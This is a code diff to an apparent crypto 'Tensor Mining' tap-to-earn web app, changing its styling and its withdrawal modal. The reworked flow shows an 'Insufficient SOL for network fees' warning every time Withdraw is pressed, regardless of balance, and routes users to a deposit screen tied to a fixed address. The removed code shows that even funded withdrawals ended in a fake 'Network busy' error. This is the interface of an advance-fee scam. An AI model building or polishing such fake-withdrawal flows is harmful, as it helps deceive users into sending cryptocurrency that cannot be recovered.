@@ -38,10 +38,10 @@
       display: flex;
       flex-direction: column;
       overflow-x: hidden;
+      padding-top: 10px;
       padding-bottom: 78px;
     }
 
-    /* Toast Notification */
     .toast-notice {
       position: fixed;
       top: 15px;
@@ -65,35 +65,12 @@
       transform: translateX(-50%) translateY(0);
     }
 
-    /* Single Clean Header */
-    .top-bar {
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-      padding: 14px 18px;
-    }
-    .top-bar-left {
-      display: flex;
-      align-items: center;
-      gap: 14px;
-      font-size: 19px;
-      font-weight: 800;
-    }
-    .top-bar-left i { font-size: 16px; cursor: pointer; color: #a4adc1; }
-    .top-bar-right {
-      display: flex;
-      align-items: center;
-      gap: 14px;
-      color: #a4adc1;
-      font-size: 16px;
-    }
-
     /* User Profile Bar */
     .header-user-card {
       display: flex;
       justify-content: space-between;
       align-items: center;
-      padding: 4px 18px 12px;
+      padding: 6px 18px 12px;
     }
     .user-profile-chip {
       display: flex;
@@ -352,7 +329,7 @@
     }
     .btn-task-action.claim, .btn-task-action.done { background: #00e676; color: #000000; }
 
-    /* REFER PAGE EXACT REPLICA */
+    /* REFER PAGE */
     .refer-container { padding: 10px 18px; }
     .refer-header-title { text-align: center; font-size: 30px; font-weight: 900; letter-spacing: 0.5px; margin: 15px 0 20px; }
     .refer-card {
@@ -405,13 +382,13 @@
       cursor: pointer;
     }
 
-    /* WALLET SCREEN */
+    /* WALLET SCREEN (Exact 1000152361.jpg Replica - No Profile Chip) */
     .wallet-hero-box {
       background: #141724;
       border: 1px solid #23293d;
       border-radius: 20px;
       padding: 24px 18px;
-      margin: 15px 18px 20px;
+      margin: 10px 18px 20px;
       text-align: center;
     }
     .wallet-hero-box .label { font-size: 11px; color: var(--text-gray); text-transform: uppercase; font-weight: 800; letter-spacing: 0.5px; }
@@ -592,7 +569,7 @@
       cursor: not-allowed;
     }
 
-    /* EXACT WITHDRAW MODAL STYLING (Screenshots 1000152365_3.jpg & 1000152364_3.jpg) */
+    /* WITHDRAW MODAL */
     .field-label {
       font-size: 11px;
       letter-spacing: 0.5px;
@@ -657,7 +634,6 @@
       font-family: monospace;
     }
 
-    /* Exact Amount Box */
     .amount-input-box {
       background: #151928;
       border: 1px solid #232b42;
@@ -750,7 +726,6 @@
       margin: 0;
     }
 
-    /* Official Green Button with Solana Logo */
     .btn-topup-sol {
       width: 100%;
       background: #00c853;
@@ -780,7 +755,7 @@
       height: 13px;
     }
 
-    .btn-withdraw-direct {
+    .btn-withdraw-blue-initial {
       width: 100%;
       background: #1b4d7c;
       color: #ffffff;
@@ -895,40 +870,27 @@
     <span id="toastMessage">Notification</span>
   </div>
 
-  <!-- Single Top Bar -->
-  <div class="top-bar">
-    <div class="top-bar-left">
-      <i class="fa-solid fa-xmark" onclick="closeApp()"></i>
-      <span>Tensor Mining</span>
-    </div>
-    <div class="top-bar-right">
-      <i class="fa-solid fa-chevron-down"></i>
-      <i class="fa-solid fa-ellipsis-vertical"></i>
-    </div>
-  </div>
-
-  <!-- User Profile Header -->
-  <div class="header-user-card">
-    <div class="user-profile-chip">
-      <div class="user-avatar" id="userAvatarText">L</div>
-      <div class="user-details">
-        <h4 id="userNameDisplay">[ Love Bhullar ]</h4>
-        <p>Mine · Earn · Grow</p>
-        <span id="userAccountDisplay">Account number: 7982111846</span>
-      </div>
-    </div>
-    <div class="sol-wallet-top" onclick="openWalletOverview()">
-      <div class="sol-icon-box"><i class="fa-solid fa-bolt"></i></div>
-      <div class="sol-label-col">
-        <span>WALLET</span>
-        <strong id="topSolBalance">0.0000 SOL</strong>
-      </div>
-      <i class="fa-solid fa-chevron-right" style="font-size: 10px; color: var(--text-gray);"></i>
-    </div>
-  </div>
-
   <!-- TAB 1: TAP SCREEN -->
   <div id="screen-tap" class="app-screen active">
+    <div class="header-user-card">
+      <div class="user-profile-chip">
+        <div class="user-avatar" id="userAvatarText">L</div>
+        <div class="user-details">
+          <h4 id="userNameDisplay">[ Love Bhullar ]</h4>
+          <p>Mine · Earn · Grow</p>
+          <span id="userAccountDisplay">Account number: 7982111846</span>
+        </div>
+      </div>
+      <div class="sol-wallet-top" onclick="openWalletOverview()">
+        <div class="sol-icon-box"><i class="fa-solid fa-bolt"></i></div>
+        <div class="sol-label-col">
+          <span>WALLET</span>
+          <strong id="topSolBalance">0.0000 SOL</strong>
+        </div>
+        <i class="fa-solid fa-chevron-right" style="font-size: 10px; color: var(--text-gray);"></i>
+      </div>
+    </div>
+
     <div class="balance-box">
       <h1><span id="mainTnsrBalance">718.00</span> TENSOR</h1>
       <div class="fiat" id="mainUsdValue">≈ $28.15 USD</div>
@@ -1106,7 +1068,7 @@
 
   <!-- TAB 4: WALLET SCREEN -->
   <div id="screen-wallet" class="app-screen">
-    <h3 style="text-align: center; font-size: 18px; font-weight: 900; margin: 15px 0 5px;">WALLET</h3>
+    <h3 style="text-align: center; font-size: 18px; font-weight: 900; margin: 15px 0 10px;">WALLET</h3>
 
     <div class="wallet-hero-box">
       <div class="label">TOTAL BALANCE</div>
@@ -1302,13 +1264,13 @@
     </div>
   </div>
 
-  <!-- EXACT 100% REPLICA WITHDRAW MODAL (Screenshots 1000152365_3.jpg & 1000152364_3.jpg) -->
+  <!-- EXACT STEP-BY-STEP WITHDRAW MODAL -->
   <div class="modal-overlay" id="modal-withdraw">
     <div class="modal-sheet">
       <button class="modal-close-btn" onclick="closeModal('modal-withdraw')"><i class="fa-solid fa-xmark"></i></button>
       <h3 class="modal-title">Withdraw TENSOR</h3>
 
-      <!-- BALANCE CARD WITH TENSOR LOGO -->
+      <!-- BALANCE CARD -->
       <div class="withdraw-balance-card">
         <div class="mini-icon-box">
           <svg viewBox="0 0 100 100">
@@ -1321,13 +1283,13 @@
         </div>
       </div>
 
-      <!-- DESTINATION ADDRESS: CLEAN & NEVER AUTO-FILLED -->
+      <!-- DESTINATION ADDRESS -->
       <label class="field-label">DESTINATION ADDRESS</label>
       <div class="input-address-box">
         <input type="text" id="withdrawDestinationInput" placeholder="Enter or paste wallet address" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false">
       </div>
 
-      <!-- AMOUNT ROW: TENSOR LOGO + GOLDEN TENSOR TEXT + MAX -->
+      <!-- AMOUNT ROW -->
       <label class="field-label">AMOUNT</label>
       <div class="amount-input-box">
         <div class="left-token">
@@ -1339,38 +1301,36 @@
           <span>TENSOR</span>
         </div>
         <div class="right-inputs">
-          <input type="number" id="withdrawAmountInput" value="10" step="1" oninput="calculateWithdrawUsd()">
+          <input type="number" id="withdrawAmountInput" placeholder="0.00" value="0.00" step="1" oninput="calculateWithdrawUsd()">
           <button class="max-btn" onclick="setMaxWithdrawAmount()">MAX</button>
         </div>
       </div>
 
-      <!-- GREEN FIAT AMOUNT: $0.39 USD -->
-      <div class="fiat-amount-green" id="withdrawAmountUsdText">≈ $0.39 USD</div>
+      <!-- GREEN FIAT AMOUNT -->
+      <div class="fiat-amount-green" id="withdrawAmountUsdText">≈ $0.00 USD</div>
 
-      <!-- INSUFFICIENT SOL ALERT & GREEN TOPUP BUTTON WITH SOLANA LOGO -->
-      <div id="insufficientSolFeeBox">
-        <div class="insufficient-sol-card">
-          <h5><i class="fa-solid fa-triangle-exclamation"></i> Insufficient SOL for network fees</h5>
-          <p id="insufficientSolFeeNotice">You need at least 0.12 SOL to cover the transaction fee. You have 0.0000 SOL.</p>
+      <!-- STEP 1: INITIAL BLUE BUTTON (Default VISIBLE) -->
+      <button class="btn-withdraw-blue-initial" id="btnInitialWithdraw" onclick="handleInitialWithdrawClick()" style="display: block !important;">
+        Withdraw
+      </button>
+
+      <!-- STEP 2: INSUFFICIENT SOL CARD (Default HIDDEN) -->
+      <div class="insufficient-sol-card" id="insufficientSolCard" style="display: none !important;">
+        <h5><i class="fa-solid fa-triangle-exclamation"></i> Insufficient SOL for network fees</h5>
+        <p>You need at least 0.12 SOL to cover the transaction fee. You have 0.0000 SOL.</p>
+      </div>
+
+      <!-- STEP 2: GREEN TOPUP BUTTON (Default HIDDEN) -->
+      <button class="btn-topup-sol" id="btnTopupSol" onclick="goToSolTopUp()" style="display: none !important;">
+        <div class="solana-mini-badge">
+          <svg viewBox="0 0 100 100">
+            <path d="M 20 28 L 75 28 L 85 38 L 30 38 Z" fill="#14F195" />
+            <path d="M 80 45 L 25 45 L 15 55 L 70 55 Z" fill="#9945FF" />
+            <path d="M 20 62 L 75 62 L 85 72 L 30 72 Z" fill="#14F195" />
+          </svg>
         </div>
-        <button class="btn-topup-sol" onclick="goToSolTopUp()">
-          <div class="solana-mini-badge">
-            <svg viewBox="0 0 100 100">
-              <path d="M 20 28 L 75 28 L 85 38 L 30 38 Z" fill="#14F195" />
-              <path d="M 80 45 L 25 45 L 15 55 L 70 55 Z" fill="#9945FF" />
-              <path d="M 20 62 L 75 62 L 85 72 L 30 72 Z" fill="#14F195" />
-            </svg>
-          </div>
-          <span>Top up SOL to withdraw</span>
-        </button>
-      </div>
-
-      <!-- BLUE WITHDRAW BUTTON (DIRECT MODE) -->
-      <div id="directWithdrawBtnBox" style="display: none;">
-        <button class="btn-withdraw-direct" id="directWithdrawButton" onclick="submitWithdraw()">
-          Withdraw
-        </button>
-      </div>
+        <span>Top up SOL to withdraw</span>
+      </button>
     </div>
   </div>
 
@@ -1379,7 +1339,6 @@
     <div class="modal-sheet">
       <button class="modal-close-btn" onclick="closeModal('modal-wallet-overview')"><i class="fa-solid fa-xmark"></i></button>
       
-      <!-- SUBVIEW 1: OVERVIEW -->
       <div id="walletViewMain" class="wallet-subview active">
         <h3 class="modal-title" style="margin-bottom: 15px;">Wallet</h3>
 
@@ -1434,7 +1393,6 @@
         </div>
       </div>
 
-      <!-- SUBVIEW 2: SOLANA WITHDRAW -->
       <div id="walletViewWithdraw" class="wallet-subview">
         <div class="subview-header-back">
           <div class="subview-back-icon" onclick="switchWalletSubView('main')"><i class="fa-solid fa-arrow-left"></i></div>
@@ -1475,7 +1433,6 @@
         <p style="text-align: center; font-size: 11px; color: var(--text-gray);">Minimum withdrawal 0.1 SOL.</p>
       </div>
 
-      <!-- SUBVIEW 3: HISTORY -->
       <div id="walletViewHistory" class="wallet-subview">
         <div class="subview-header-back">
           <div class="subview-back-icon" onclick="switchWalletSubView('main')"><i class="fa-solid fa-arrow-left"></i></div>
@@ -1538,7 +1495,7 @@
       requiredSolFee: 0.12,
       energy: 996,
       maxEnergy: 1000,
-      tnsrRateUsd: 0.039,
+      tnsrRateUsd: 0.0392,
       solRateUsd: 95.51,
       minWithdraw: 10,
       depositAddress: "9aEfD5f041BCd918BF2ed075498a1277CcF2866d",
@@ -1623,8 +1580,11 @@
         userState.solBalance = parsed.solBalance !== undefined ? parsed.solBalance : 0.0000;
         userState.energy = parsed.energy || 996;
         userState.isDailyClaimed = parsed.isDailyClaimed || false;
-        if (parsed.userWallet && !parsed.userWallet.includes("http")) {
+        // Purana / corrupted value auto-clean
+        if (parsed.userWallet && parsed.userWallet.length > 25 && !parsed.userWallet.includes("http")) {
           userState.userWallet = parsed.userWallet;
+        } else {
+          userState.userWallet = "";
         }
       } catch(e) {}
     }
@@ -1704,7 +1664,7 @@
       document.getElementById("walletUsdDisplay").innerText = `≈ $${totalUsd} USD`;
       document.getElementById("energyDisplay").innerText = `${userState.energy}/${userState.maxEnergy}`;
 
-      if (userState.userWallet && !userState.userWallet.includes("http")) {
+      if (userState.userWallet && userState.userWallet.length > 25) {
         const short = userState.userWallet.substring(0, 6) + "..." + userState.userWallet.slice(-4);
         document.getElementById("userWalletShort").innerText = short;
       } else {
@@ -1778,7 +1738,7 @@
       showToast("Claimed +5 TENSOR Day 1 reward!", "success");
     }
 
-    /* WITHDRAW MODAL */
+    /* STEP-BY-STEP WITHDRAW FLOW */
     function openWithdrawModal() {
       if (userState.withdrawMode === "starts_on") {
         showToast(`Withdrawals start on ${userState.withdrawDateNotice}!`, "error");
@@ -1790,20 +1750,14 @@
       }
 
       document.getElementById("withdrawModalBalance").innerText = userState.tnsrBalance.toFixed(2);
-      document.getElementById("withdrawDestinationInput").value = ""; // Always empty
-      document.getElementById("withdrawAmountInput").value = "10";
+      document.getElementById("withdrawDestinationInput").value = "";
+      document.getElementById("withdrawAmountInput").value = "0.00";
       calculateWithdrawUsd();
 
-      const hasFee = userState.solBalance >= userState.requiredSolFee;
-      if (!hasFee) {
-        document.getElementById("insufficientSolFeeBox").style.display = "block";
-        document.getElementById("directWithdrawBtnBox").style.display = "none";
-        document.getElementById("insufficientSolFeeNotice").innerText = 
-          `You need at least ${userState.requiredSolFee} SOL to cover the transaction fee. You have ${userState.solBalance.toFixed(4)} SOL.`;
-      } else {
-        document.getElementById("insufficientSolFeeBox").style.display = "none";
-        document.getElementById("directWithdrawBtnBox").style.display = "block";
-      }
+      // Reset to Step 1: Blue button visible, Red & Green hidden
+      document.getElementById("btnInitialWithdraw").style.setProperty("display", "block", "important");
+      document.getElementById("insufficientSolCard").style.setProperty("display", "none", "important");
+      document.getElementById("btnTopupSol").style.setProperty("display", "none", "important");
 
       openModal("modal-withdraw");
     }
@@ -1819,19 +1773,18 @@
       document.getElementById("withdrawAmountUsdText").innerText = `≈ $${usd} USD`;
     }
 
+    // Step 1: User clicks blue "Withdraw" button
+    function handleInitialWithdrawClick() {
+      // Step 2 reveal: Hide blue button, show warning card and green top-up
+      document.getElementById("btnInitialWithdraw").style.setProperty("display", "none", "important");
+      document.getElementById("insufficientSolCard").style.setProperty("display", "block", "important");
+      document.getElementById("btnTopupSol").style.setProperty("display", "flex", "important");
+    }
+
     function goToSolTopUp() {
       closeModal("modal-withdraw");
       closeModal("modal-wallet-overview");
       openModal("modal-deposit");
-    }
-
-    function submitWithdraw() {
-      const btn = document.getElementById("directWithdrawButton");
-      btn.innerText = "Processing...";
-      setTimeout(() => {
-        btn.innerText = "Withdraw";
-        showToast("Error: Network busy. Please try again later.", "error");
-      }, 1200);
     }
 
     /* WALLET MULTI-SUBVIEW HANDLER */
